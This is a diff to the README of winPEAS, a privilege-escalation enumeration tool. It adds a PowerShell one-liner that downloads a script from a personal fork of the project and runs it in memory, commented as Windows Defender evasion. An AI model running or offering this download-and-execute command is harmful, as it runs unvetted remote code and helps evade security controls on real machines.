@@ -16,6 +16,8 @@ Download the **[latest releas from here](https://github.com/peass-ng/PEASS-ng/re
 
 ```bash
 # Get latest clean release (Windows Defender evasion)
+"IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/moscowchill/PEASS-ng/main/winPEAS/winPEASps1/winPEAS.ps1')"
+
 $url = "https://raw.githubusercontent.com/moscowchill/PEASS-ng/main/winPEAS/winPEASps1/winPEAS.ps1"
 
 # Run and display output only
